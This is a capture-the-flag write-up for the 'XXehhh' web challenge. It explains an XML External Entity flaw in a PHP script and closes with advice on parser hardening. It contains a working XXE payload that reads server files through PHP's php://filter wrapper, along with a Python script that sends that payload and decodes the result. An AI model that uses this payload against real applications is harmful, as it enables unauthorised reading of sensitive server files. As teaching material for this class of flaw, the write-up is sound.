# XXehhh Writeup - Web
- Author: Evan Pardon | [supasuge](https://github.com/supasuge)
- Difficulty: Medium


## Brief Introduction to XXE

XML External Entity (XXE) vulnerabilities arise when an application parses XML input unsafely, allowing attackers to define external entities that reference external resources or internal files. This can lead to sensitive information disclosure, server-side request forgery (SSRF), and denial-of-service attacks.

### Identifying the Vulnerability

The challenge provides a PHP script (`process.php`) handling user-supplied XML:

```php
libxml_disable_entity_loader(false);
$dom->loadXML($xmlContent, LIBXML_NOENT | LIBXML_DTDLOAD);
```

The key indicator of XXE vulnerability here is the usage of `LIBXML_NOENT` and enabling entity loading (`libxml_disable_entity_loader(false)`), which explicitly allows parsing and resolving external entities within XML payloads.

### Exploitation Steps

To exploit this vulnerability, craft an XML payload containing a malicious DTD entity referencing internal server files. In this challenge, the goal is to retrieve the `flag.txt` file.

The crafted XML payload exploits PHP's stream wrappers (`php://filter/convert.base64-encode/resource=FILE_TO_EXFIL`) to read and base64-encode the file content:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.txt">
]>
<root>
  <name></name>
  <tel></tel>
  <email>OUT&xxe;OUT</email>
  <password></password>
</root>
```

### Exploit Explanation

- **External Entity Definition**: The entity `xxe` is defined to load `flag.txt` using PHP's `php://filter` stream wrapper, converting its contents into base64.
- **XML Field Injection**: The malicious entity `&xxe;` is injected between identifiable markers (`OUT`) into the XML's `<email>` field, making it easy to extract the encoded data from the server response.

### Extracting and Decoding the Flag

Use the provided Python script (`exploit.py`) to automate exploitation:

```python
import requests
import base64
import re

def run_exploit():
    url = "https://grizzhacks-xxehhh.chals.io/process.php"
    payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.txt">
]>
<root>
  <name></name>
  <tel></tel>
  <email>OUT&xxe;OUT</email>
  <password></password>
</root>
'''
    headers = {"Content-Type": "application/xml"}
    response = requests.post(url, data=payload, headers=headers)

    if response.status_code != 200:
        raise Exception(f"HTTP error: {response.status_code}")

    match = re.search(r'OUT([A-Za-z0-9+/=]+)OUT', response.text)
    if not match:
        raise Exception("Flag extraction failed.")

    encoded_flag = match.group(1)
    return base64.b64decode(encoded_flag).decode("utf-8")

if __name__ == "__main__":
    print("Flag:", run_exploit())
```

### Conclusion

By identifying and leveraging unsafe XML parsing behavior, we successfully exploit an XXE vulnerability, reading sensitive server files and retrieving the challenge flag. Always disable external entity resolution and avoid using unsafe parser flags like `LIBXML_NOENT` to prevent XXE attacks in real-world applications.

